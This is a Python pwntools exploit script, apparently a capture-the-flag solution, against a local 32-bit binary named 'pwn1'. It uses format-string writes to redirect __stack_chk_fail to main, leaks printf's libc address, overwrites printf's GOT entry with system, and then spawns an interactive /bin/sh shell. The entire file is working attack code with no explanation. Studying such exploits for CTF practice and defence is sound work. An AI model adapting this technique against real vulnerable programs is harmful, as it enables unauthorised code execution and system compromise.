#!/usr/bin/env python
# coding=utf-8
from pwn import *

context(arch='i386', os='linux')
# context.log_level='debug'

def foo(payload):
    p = process('./pwn1')
    p.sendline(payload)
    ret = p.recv()
    p.close()
    return ret

# autofmt = FmtStr(foo)
# offset = autofmt.offset
# print offset
libc = ELF('./libc.so.6')
elf = ELF('./pwn1')
p = process('./pwn1')
check_fail_plt = elf.got['__stack_chk_fail']
main = 0x0804851B


p.recvuntil('name:')

p.sendline(fmtstr_payload(46, {check_fail_plt: main}, write_size='byte').ljust(103))

p.recvuntil('messages:')
p.sendline('a') 

p.recvuntil('name:')
p.sendline((p32(elf.got['printf']) + '%46$s').ljust(103))
p.recvuntil('\n')
r = p.recv()
printf_addr = u32(r[4:8])
system_addr = printf_addr - libc.symbols['printf'] + libc.symbols['system']
# binsh_addr = printf_addr - libc.symbols['printf'] + next(libc.search('/bin/sh'))
print '[+]printf: ' + hex(printf_addr)
print '[+]system: ' + hex(system_addr)
# print '[+]binsh: ' + hex(binsh_addr)




p.sendline('a')



p.recvuntil('name:')
p.sendline(fmtstr_payload(46, {elf.got['printf']: system_addr}, write_size='byte').ljust(103))

p.recv()
p.sendline('/bin/sh')

p.interactive()